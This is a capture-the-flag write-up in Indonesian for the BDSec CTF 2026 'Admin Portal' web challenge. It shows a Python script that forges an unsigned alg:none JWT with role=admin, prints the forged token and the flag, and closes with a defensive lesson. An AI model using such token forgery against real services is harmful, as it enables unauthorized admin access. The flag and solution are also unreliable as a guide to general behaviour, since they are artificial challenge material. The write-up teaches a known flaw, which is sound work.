---
ctf: "BDSec CTF 2026"
kategori: "Web"
challenge: "Admin Portal"
flag: "bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}"
teknik: "Server membaca algoritma JWT dari header client-controlled; forge token alg:none dengan role=admin, tanpa signature apa pun"
---

# Admin Portal — BDSec CTF 2026 (Web, 50 poin)

## Deskripsi Singkat

Aplikasi web berbasis JWT yang menerbitkan token ter-sign HS256 setelah login username-saja. Payload token membawa `role=user`; `role=admin` membuka `/admin`.

## Analisis

Form login hanya mengirim field `username` tanpa password — portal ini cuma menerbitkan akun guest. Login sebagai `guest`:

```bash
curl -i -sS -X POST -d 'username=guest' http://66.228.54.80:8989/login
```

Cookie session-nya struktur tiga-segmen JWT klasik. Decode dua segmen pertama tanpa menyentuh signature:

```json
{"alg":"HS256","typ":"JWT"}
{"user":"guest","role":"user"}
```

Dua temuan dari satu decode: claim `role` hidup di **payload** — bagian client-controlled dari token. Kalau kita bisa memforge token dengan `role=admin`, kita tidak perlu tahu secret HMAC-nya. Field `alg` hidup di **header** — juga client-controlled. Kalau server membaca field ini saat verifikasi untuk memilih algoritma mana yang dijalankan, kita bisa menyetelnya jadi `none` dan menghilangkan seluruh langkah verifikasi.

Mengunjungi `/admin` dengan token guest yang valid mengembalikan `403 FORBIDDEN` dengan pesan "Your token says role = user" — server mencetak balik role yang dibacanya dari token. Sistem otorisasinya sepenuhnya didorong payload JWT.

## Eksploitasi / Solusi

Kelas kerentanan `alg: none` adalah salah satu bug JWT tertua. RFC 7519 dan registry algoritma RFC 7518 sama-sama mendeskripsikan `none` sebagai algoritma valid ("unsecured JWT") — tidak ada signature yang diharapkan, dan segmen signature-nya string kosong diikuti titik. Implementasi rentan yang membaca algoritma dari header sebelum memilih cara verifikasi akan memproses token `alg: none` tanpa pengecekan kriptografis sama sekali.

```python
import base64, json

def b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"user": "guest", "role": "admin"}

print(f"{b64url(header)}.{b64url(payload)}.")   # titik di akhir wajib ada
```

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

Submit sebagai cookie `session`. Server mendecode payload-nya tanpa memverifikasi signature apa pun dan memberi akses admin.

## Catatan / Insight

**Pelajaran untuk defender:** `alg` di header JWT adalah bagian dari token yang ditulis client — meletakkan pilihan algoritma di dalam token lalu mempercayai pilihan itu setara dengan membiarkan client memilih kuncinya sendiri. Library JWT yang benar harus mengunci daftar algoritma yang diizinkan di sisi server (`jwt.decode(token, key, algorithms=["HS256"])`), bukan membaca `alg` dari token.

## Flag

```
bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}
```
